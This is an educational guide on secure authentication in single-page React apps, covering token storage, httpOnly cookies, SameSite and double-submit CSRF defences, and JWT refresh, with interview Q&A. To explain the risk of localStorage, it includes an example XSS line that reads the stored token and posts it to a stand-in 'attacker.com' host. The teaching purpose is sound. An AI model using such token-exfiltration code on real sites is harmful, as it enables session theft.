# Authentication Patterns

## Quick Reference

| Storage | CSRF risk | XSS risk | HttpOnly | Best for |
|---|---|---|---|---|
| localStorage | None | High (JS-readable) | No | Never for auth tokens |
| sessionStorage | None | High (JS-readable) | No | Never for auth tokens |
| Memory (JS var) | None | Medium (in-page only) | No | Access tokens (short TTL) |
| httpOnly cookie | Yes (mitigated) | None (JS can't read) | Yes | Refresh tokens, session cookies |

---

## The Core Tradeoff

The fundamental tension in SPA authentication: **tokens stored in JS are XSS-vulnerable; tokens stored in httpOnly cookies are CSRF-vulnerable**.

There is no storage option that eliminates both risks simultaneously. The industry has converged on a pattern that accepts CSRF risk (which is mitigatable) in exchange for XSS protection.

---

## Why localStorage is the Wrong Choice for Auth Tokens

```ts
// Commonly seen — commonly wrong
localStorage.setItem('access_token', jwtToken);

// Any XSS on your page can do:
const stolen = localStorage.getItem('access_token');
fetch('https://attacker.com/collect', { method: 'POST', body: stolen });
```

If an attacker achieves XSS on your app — even through a third-party script you loaded — they exfiltrate the token and can make API calls as the user indefinitely (until the token expires). With a refresh token in localStorage, the session is compromised until the user explicitly logs out.

---

## The Recommended Pattern: httpOnly Cookies

The server sets authentication cookies with `httpOnly` and `Secure` flags. JavaScript cannot read `httpOnly` cookies — `document.cookie` won't show them.

**Server-side (express example):**
```ts
res.cookie('session_token', token, {
  httpOnly: true,    // JS cannot read this cookie
  secure: true,      // HTTPS only
  sameSite: 'lax',   // CSRF mitigation
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
});
```

**Client-side React:**
```ts
// Credentials are sent automatically with every request
const response = await fetch('/api/user', {
  credentials: 'include', // required for cross-origin — same-origin is default
});
```

The React app never sees the token. The browser attaches it automatically to every request.

---

## CSRF Risk and Mitigation

`httpOnly` cookies introduce CSRF risk: a malicious site can trigger a browser request to your API, and the browser will automatically attach the cookie.

**Mitigation 1: SameSite cookie attribute**

```ts
sameSite: 'lax'   // Cookie sent on top-level navigation (GET), not on cross-site POST/fetch
sameSite: 'strict' // Cookie never sent on cross-site requests (breaks some OAuth flows)
sameSite: 'none'  // Always sent — requires Secure; use only if truly cross-site needed
```

`SameSite: lax` blocks the most common CSRF vectors (form submissions, cross-site AJAX). Most modern apps use this.

**Mitigation 2: CSRF token (double-submit cookie pattern)**

```ts
// Server sends a non-httpOnly CSRF token in a readable cookie
res.cookie('csrf_token', csrfToken, { httpOnly: false });

// Client reads it and includes it in request headers
const csrfToken = document.cookie
  .split('; ')
  .find(row => row.startsWith('csrf_token='))
  ?.split('=')[1];

fetch('/api/action', {
  method: 'POST',
  headers: { 'X-CSRF-Token': csrfToken },
  credentials: 'include',
});

// Server validates that the header value matches the cookie value
// Attacker can't set the header — same-origin policy blocks cross-site header access
```

---

## JWT Specifics

JWTs are the common token format. They encode claims (user ID, roles, expiry) as a signed payload — the server can validate them without a database lookup.

```ts
// JWT structure: header.payload.signature (base64-encoded, dot-separated)
// Payload (publicly readable — don't put sensitive data here):
{
  "sub": "user_123",
  "role": "admin",
  "exp": 1735689600,
  "iat": 1735603200
}
```

**In the httpOnly cookie pattern:**
- Short-lived access token: keep in memory (a React state or module-level variable)
- Refresh token: store in httpOnly cookie
- On app load or access token expiry, call `/api/auth/refresh` to get a new access token using the refresh token cookie

```ts
// Token refresh pattern
let accessToken: string | null = null;

async function fetchWithAuth(url: string, options: RequestInit = {}) {
  if (!accessToken) {
    // Refresh silently
    const res = await fetch('/api/auth/refresh', { credentials: 'include' });
    if (!res.ok) throw new Error('Not authenticated');
    const data = await res.json();
    accessToken = data.accessToken;
  }

  return fetch(url, {
    ...options,
    headers: { ...options.headers, Authorization: `Bearer ${accessToken}` },
  });
}
```

---

## React Auth Context Pattern

```tsx
interface AuthContextValue {
  user: User | null;
  isLoading: boolean;
  login: (credentials: Credentials) => Promise<void>;
  logout: () => Promise<void>;
}

const AuthContext = createContext<AuthContextValue | null>(null);

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // Restore session on mount
    fetch('/api/auth/me', { credentials: 'include' })
      .then(r => r.ok ? r.json() : null)
      .then(setUser)
      .finally(() => setIsLoading(false));
  }, []);

  const login = async (credentials: Credentials) => {
    const res = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials),
      credentials: 'include',
    });
    if (!res.ok) throw new Error('Login failed');
    const { user } = await res.json();
    setUser(user);
  };

  const logout = async () => {
    await fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });
    setUser(null);
  };

  return (
    <AuthContext.Provider value={{ user, isLoading, login, logout }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const ctx = useContext(AuthContext);
  if (!ctx) throw new Error('useAuth must be used within AuthProvider');
  return ctx;
}
```

---

> **Check yourself:** Your app uses Auth0 for SSO. Auth0 redirects back to your app with an `id_token` in the URL fragment after login. What do you do with it? Read it from the URL hash, validate it on the server, exchange it for a session, then set an httpOnly session cookie. Never store it in localStorage. Clear it from the URL immediately with `history.replaceState`.

---

## Self-Assessment

- [ ] I can explain why localStorage is not safe for auth tokens
- [ ] I know what httpOnly cookies protect against (XSS) and what they don't (CSRF)
- [ ] I understand what `SameSite: lax` does for CSRF mitigation
- [ ] I know the access token + refresh token pattern and where each lives
- [ ] I can implement an AuthContext that restores session on mount

---

## Interview Q&A

**Q: Where should you store JWTs in a SPA? `High`**

A: Not in localStorage or sessionStorage — both are readable by any JavaScript on the page, making them XSS-vulnerable. The recommended pattern is: store the refresh token in an httpOnly cookie (invisible to JS), and keep the short-lived access token in memory (a module variable or React state). On page load or access token expiry, call a refresh endpoint that uses the cookie to issue a new access token.

---

**Q: What is the CSRF risk with httpOnly cookies, and how do you mitigate it? `High`**

A: When authentication state is in a cookie, the browser sends it automatically on every request — including requests triggered by a malicious third-party site. The attacker doesn't need to read the cookie; they just need to trigger requests to your API. Mitigate with `SameSite: lax` on the cookie (blocks cross-site non-GET requests) and optionally add a CSRF token (double-submit cookie pattern) for sensitive state-changing endpoints.

---

**Q: What is the double-submit cookie CSRF pattern? `Medium`**

A: The server sets a readable (not httpOnly) CSRF token in a cookie. The client reads it from `document.cookie` and sends it in a request header (`X-CSRF-Token`). The server validates that the header value matches the cookie value. An attacker on a different origin can trigger a request with the cookie (browser attaches it automatically), but cannot read the cookie value to put it in the header — same-origin policy blocks cross-origin cookie reading.

---

**Q: What does `credentials: 'include'` do on a fetch call? `Medium`**

A: By default, cross-origin `fetch` requests don't send cookies or HTTP auth headers. `credentials: 'include'` tells the browser to include cookies (and other credentials) even for cross-origin requests. Same-origin requests send credentials by default. Without this flag, your httpOnly session cookie won't be sent to a different-origin API server, and authentication will fail.
